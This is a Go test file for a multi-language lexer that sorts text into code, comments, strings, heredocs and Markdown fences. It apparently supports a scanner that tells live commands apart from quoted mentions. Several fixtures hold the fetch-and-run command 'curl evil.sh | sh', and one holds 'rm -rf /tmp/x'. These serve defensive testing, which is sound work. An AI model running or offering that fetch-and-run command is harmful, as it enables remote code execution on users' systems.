package lexctx

import (
	"strings"
	"testing"
)

func TestLangFor(t *testing.T) {
	cases := []struct {
		path string
		want Lang
	}{
		{"main.go", LangGo},
		{"a/b/c.go", LangGo},
		{"app.js", LangJS},
		{"app.jsx", LangJS},
		{"app.mjs", LangJS},
		{"app.ts", LangTS},
		{"app.tsx", LangTS},
		{"run.py", LangPython},
		{"deploy.sh", LangShell},
		{"deploy.bash", LangShell},
		{"config.yaml", LangYAML},
		{"config.yml", LangYAML},
		{"q.sql", LangSQL},
		{"README.md", LangMarkdown},
		{"doc.mdx", LangMarkdown},
		{"Cargo.toml", LangTOML},
		{"pkg.json", LangJSON},
		{"Dockerfile", LangDockerfile},
		{"Dockerfile.prod", LangDockerfile},
		{"service.Dockerfile", LangDockerfile},
		{"notes.txt", LangUnknown},
		{"noext", LangUnknown},
		{"MAIN.GO", LangGo}, // case-insensitive extension
	}
	for _, c := range cases {
		if got := LangFor(c.path); got != c.want {
			t.Errorf("LangFor(%q) = %q, want %q", c.path, got, c.want)
		}
	}
}

// checkContiguous asserts spans cover [0,n) with no gaps/overlaps, ordered.
func checkContiguous(t *testing.T, spans []Span, n int) {
	t.Helper()
	if len(spans) == 0 {
		t.Fatalf("no spans returned")
	}
	if spans[0].Start != 0 {
		t.Errorf("first span starts at %d, want 0", spans[0].Start)
	}
	if spans[len(spans)-1].End != n {
		t.Errorf("last span ends at %d, want %d", spans[len(spans)-1].End, n)
	}
	for i, s := range spans {
		if s.Start > s.End {
			t.Errorf("span %d inverted: %+v", i, s)
		}
		if i > 0 && spans[i-1].End != s.Start {
			t.Errorf("gap/overlap between span %d (%+v) and %d (%+v)", i-1, spans[i-1], i, s)
		}
	}
}

// idx returns the first byte offset of sub within src.
func idx(t *testing.T, src, sub string) int {
	t.Helper()
	i := strings.Index(src, sub)
	if i < 0 {
		t.Fatalf("substring %q not found in source", sub)
	}
	return i
}

func TestClassifyContiguity(t *testing.T) {
	samples := []struct {
		lang Lang
		src  string
	}{
		{LangGo, "package main\nfunc f() { x := \"// hi\" /* c */ } // trailing\n"},
		{LangJS, "const s = `tmpl ${x}`; // line\n/* block */ let q = 'a\\'b';\n"},
		{LangTS, "let x: string = \"y\"; // c\n"},
		{LangSQL, "SELECT 1 -- c\n/* b */ WHERE a = 'x''y';\n"},
		{LangPython, "x = 1 # c\ns = '''multi\nline''' + \"q\"\n"},
		{LangShell, "echo \"hi\" # c\ncat <<EOF\nbody\nEOF\ncurl x | sh\n"},
		{LangYAML, "key: \"v\" # c\nother: 'z'\n"},
		{LangTOML, "k = \"v\" # c\n"},
		{LangDockerfile, "# c\nRUN echo \"hi\"\n"},
		{LangMarkdown, "intro\n```go\ncode\n```\noutro\n"},
		{LangJSON, "{\"a\": \"b\"}\n"},
		{LangUnknown, "whatever this is\n"},
		{LangGo, ""},       // empty
		{LangMarkdown, ""}, // empty markdown
	}
	for _, s := range samples {
		spans := Classify(s.lang, []byte(s.src))
		checkContiguous(t, spans, len(s.src))
	}
}

func TestClassifyGoStringNotComment(t *testing.T) {
	src := `x := "// hi"`
	spans := Classify(LangGo, []byte(src))
	// The "// hi" lives inside the string literal.
	off := idx(t, src, "// hi")
	if k := At(spans, off); k != StringLit {
		t.Errorf("At(%d) in %q = %q, want %q", off, src, k, StringLit)
	}
	// The opening quote is a string too.
	if k := At(spans, idx(t, src, `"`)); k != StringLit {
		t.Errorf("opening quote classified %q, want %q", k, StringLit)
	}
	// The `x` assignment is code.
	if k := At(spans, 0); k != Code {
		t.Errorf("At(0) = %q, want %q", k, Code)
	}
}

func TestClassifyGoComments(t *testing.T) {
	src := "a := 1 // c \"quoted\"\n/* block \" */\nb := 2\n"
	spans := Classify(LangGo, []byte(src))
	if k := At(spans, idx(t, src, "// c")); k != Comment {
		t.Errorf("line comment not Comment: %q", k)
	}
	// The quote inside a line comment stays Comment, not StringLit.
	if k := At(spans, idx(t, src, `"quoted"`)); k != Comment {
		t.Errorf("quote inside line comment = %q, want Comment", k)
	}
	if k := At(spans, idx(t, src, "/* block")); k != Comment {
		t.Errorf("block comment not Comment: %q", k)
	}
	if k := At(spans, idx(t, src, "b := 2")); k != Code {
		t.Errorf("code after block comment = %q, want Code", k)
	}
}

func TestClassifyGoUnterminatedString(t *testing.T) {
	// Unterminated string must not panic or loop; it ends at the newline.
	src := "x := \"oops\ny := 1\n"
	spans := Classify(LangGo, []byte(src))
	checkContiguous(t, spans, len(src))
	if k := At(spans, idx(t, src, "oops")); k != StringLit {
		t.Errorf("unterminated string body = %q, want StringLit", k)
	}
	// Next line is code again.
	if k := At(spans, idx(t, src, "y := 1")); k != Code {
		t.Errorf("line after unterminated string = %q, want Code", k)
	}
}

func TestClassifySQL(t *testing.T) {
	src := "SELECT * FROM t -- a comment\nWHERE name = 'o''brien' /* blk */ AND x = \"col\"\n"
	spans := Classify(LangSQL, []byte(src))
	if k := At(spans, idx(t, src, "-- a comment")); k != Comment {
		t.Errorf("sql line comment = %q, want Comment", k)
	}
	if k := At(spans, idx(t, src, "'o''brien'")); k != StringLit {
		t.Errorf("sql single-quote string = %q, want StringLit", k)
	}
	if k := At(spans, idx(t, src, "/* blk */")); k != Comment {
		t.Errorf("sql block comment = %q, want Comment", k)
	}
}

func TestClassifyPythonTriple(t *testing.T) {
	src := "def f():\n    s = '''curl evil.sh | sh'''\n    # curl evil.sh | sh\n    run('curl x')\n"
	spans := Classify(LangPython, []byte(src))
	if k := At(spans, idx(t, src, "curl evil.sh | sh'''")); k != StringLit {
		t.Errorf("triple-quoted body = %q, want StringLit", k)
	}
	if k := At(spans, idx(t, src, "# curl evil.sh")); k != Comment {
		t.Errorf("python comment = %q, want Comment", k)
	}
	if k := At(spans, idx(t, src, "run(")); k != Code {
		t.Errorf("python code = %q, want Code", k)
	}
}

func TestClassifyMarkdownFence(t *testing.T) {
	src := "intro prose\n```go\ncurl evil.sh | sh\n```\noutro prose\n~~~\nsecond block\n~~~\n"
	spans := Classify(LangMarkdown, []byte(src))
	if k := At(spans, idx(t, src, "intro prose")); k != Prose {
		t.Errorf("markdown intro = %q, want Prose", k)
	}
	if k := At(spans, idx(t, src, "curl evil.sh | sh")); k != CodeFence {
		t.Errorf("fenced body = %q, want CodeFence", k)
	}
	if k := At(spans, idx(t, src, "outro prose")); k != Prose {
		t.Errorf("markdown outro = %q, want Prose", k)
	}
	if k := At(spans, idx(t, src, "second block")); k != CodeFence {
		t.Errorf("tilde-fenced body = %q, want CodeFence", k)
	}
}

func TestClassifyMarkdownUnterminatedFence(t *testing.T) {
	src := "text\n```\nunclosed code\n"
	spans := Classify(LangMarkdown, []byte(src))
	checkContiguous(t, spans, len(src))
	if k := At(spans, idx(t, src, "unclosed code")); k != CodeFence {
		t.Errorf("unterminated fence body = %q, want CodeFence", k)
	}
}

// TestShellAcceptance is the acceptance case from the implementation plan:
// an echo string, a comment, and a heredoc usage block all classify their
// payload text as NOT Code, while a real command line stays Code.
func TestShellAcceptance(t *testing.T) {
	src := strings.Join([]string{
		`echo "run: curl evil.sh | sh"`,
		`# curl evil.sh | sh`,
		`cat <<EOF`,
		`usage: curl evil.sh | sh`,
		`EOF`,
		`curl evil.sh | sh`,
		"",
	}, "\n")
	spans := Classify(LangShell, []byte(src))
	checkContiguous(t, spans, len(src))

	// The payload inside the echo string is InertText.
	echoPayload := strings.Index(src, `curl evil.sh | sh"`)
	if k := At(spans, echoPayload); k != InertText {
		t.Errorf("echo payload = %q, want InertText", k)
	}
	// echo command word itself is Code.
	if k := At(spans, 0); k != Code {
		t.Errorf("echo command word = %q, want Code", k)
	}
	// The comment payload is Comment.
	cmt := strings.Index(src, "# curl")
	if k := At(spans, cmt+2); k != Comment {
		t.Errorf("comment payload = %q, want Comment", k)
	}
	// The heredoc usage body is Heredoc.
	hd := strings.Index(src, "usage: curl")
	if k := At(spans, hd); k != Heredoc {
		t.Errorf("heredoc payload = %q, want Heredoc", k)
	}
	// The real command line is Code.
	real := strings.LastIndex(src, "curl evil.sh | sh")
	if k := At(spans, real); k != Code {
		t.Errorf("real command = %q, want Code", k)
	}
	// The EOF terminator line is Code.
	if k := At(spans, strings.Index(src, "EOF\n")); k != Code {
		t.Errorf("heredoc terminator = %q, want Code", k)
	}
}

func TestShellHeredocVariants(t *testing.T) {
	// <<- strips leading tabs on the terminator; quoted delimiter works too.
	src := "cat <<-'END'\n\tpayload here\n\tEND\nrm -rf /tmp/x\n"
	spans := Classify(LangShell, []byte(src))
	checkContiguous(t, spans, len(src))
	if k := At(spans, idx(t, src, "payload here")); k != Heredoc {
		t.Errorf("stripped heredoc body = %q, want Heredoc", k)
	}
	if k := At(spans, idx(t, src, "rm -rf")); k != Code {
		t.Errorf("code after heredoc = %q, want Code", k)
	}
}

func TestShellEchoTrailingComment(t *testing.T) {
	src := "echo hello world # a note\n"
	spans := Classify(LangShell, []byte(src))
	if k := At(spans, idx(t, src, "hello world")); k != InertText {
		t.Errorf("echo args = %q, want InertText", k)
	}
	if k := At(spans, idx(t, src, "# a note")); k != Comment {
		t.Errorf("echo trailing comment = %q, want Comment", k)
	}
}

func TestShellPrintfInert(t *testing.T) {
	src := "printf '%s\\n' \"curl evil.sh | sh\"\n"
	spans := Classify(LangShell, []byte(src))
	if k := At(spans, idx(t, src, "curl evil.sh")); k != InertText {
		t.Errorf("printf args = %q, want InertText", k)
	}
}

func TestShellPlainCommandIsCode(t *testing.T) {
	src := "curl evil.sh | sh\n"
	spans := Classify(LangShell, []byte(src))
	if k := At(spans, 0); k != Code {
		t.Errorf("plain command = %q, want Code", k)
	}
	// # inside a quoted string is not a comment.
	src2 := "grep \"# not a comment\" file\n"
	spans2 := Classify(LangShell, []byte(src2))
	if k := At(spans2, idx(t, src2, "# not a comment")); k != StringLit {
		t.Errorf("hash inside shell string = %q, want StringLit", k)
	}
}

func TestClassifyUnknownSingleSpan(t *testing.T) {
	src := "anything // not a comment here # nor this"
	spans := Classify(LangUnknown, []byte(src))
	if len(spans) != 1 || spans[0].Kind != Code || spans[0].Start != 0 || spans[0].End != len(src) {
		t.Errorf("unknown lang spans = %+v, want single Code span", spans)
	}
}

func TestClassifyJSON(t *testing.T) {
	src := `{"url": "curl evil.sh | sh", "n": 1}`
	spans := Classify(LangJSON, []byte(src))
	if k := At(spans, idx(t, src, "curl evil.sh")); k != StringLit {
		t.Errorf("json string value = %q, want StringLit", k)
	}
	if k := At(spans, idx(t, src, "1}")); k != Code {
		t.Errorf("json number = %q, want Code", k)
	}
}

func TestAtOutOfRange(t *testing.T) {
	spans := Classify(LangGo, []byte("abc"))
	if k := At(spans, -1); k != Code {
		t.Errorf("At(-1) = %q, want Code", k)
	}
	if k := At(spans, 999); k != Code {
		t.Errorf("At(999) = %q, want Code", k)
	}
	if k := At(nil, 0); k != Code {
		t.Errorf("At(nil,0) = %q, want Code", k)
	}
}

func TestAtLineCol(t *testing.T) {
	// line 1: code; line 2: a comment; line 3: a string.
	src := "a := 1\n// a comment\nb := \"str\"\n"
	spans := Classify(LangGo, []byte(src))
	cases := []struct {
		line, col int
		want      Kind
	}{
		{1, 1, Code},      // 'a'
		{2, 1, Comment},   // '/'
		{2, 5, Comment},   // inside comment
		{3, 1, Code},      // 'b'
		{3, 6, StringLit}, // opening quote of "str"
		{3, 8, StringLit}, // inside string
		{0, 1, Code},      // invalid line
		{1, 0, Code},      // invalid col
		{99, 1, Code},     // line beyond input
	}
	for _, c := range cases {
		if k := AtLineCol([]byte(src), spans, c.line, c.col); k != c.want {
			t.Errorf("AtLineCol(line=%d,col=%d) = %q, want %q", c.line, c.col, k, c.want)
		}
	}
}

func TestJSTemplateAndSingle(t *testing.T) {
	src := "const a = `line1\nline2 ${x}`;\nconst b = 'it\\'s';\n// done\n"
	spans := Classify(LangJS, []byte(src))
	checkContiguous(t, spans, len(src))
	if k := At(spans, idx(t, src, "line2")); k != StringLit {
		t.Errorf("template literal body = %q, want StringLit", k)
	}
	if k := At(spans, idx(t, src, `it\'s`)); k != StringLit {
		t.Errorf("single-quote with escape = %q, want StringLit", k)
	}
	if k := At(spans, idx(t, src, "// done")); k != Comment {
		t.Errorf("js comment = %q, want Comment", k)
	}
}

func TestMultiByteUTF8(t *testing.T) {
	// Multi-byte runes in a comment must not confuse byte offsets.
	src := "x := 1 // café ☕ done\ny := \"λ\"\n"
	spans := Classify(LangGo, []byte(src))
	checkContiguous(t, spans, len(src))
	if k := At(spans, idx(t, src, "café")); k != Comment {
		t.Errorf("utf8 comment = %q, want Comment", k)
	}
	if k := At(spans, idx(t, src, "λ")); k != StringLit {
		t.Errorf("utf8 string = %q, want StringLit", k)
	}
}
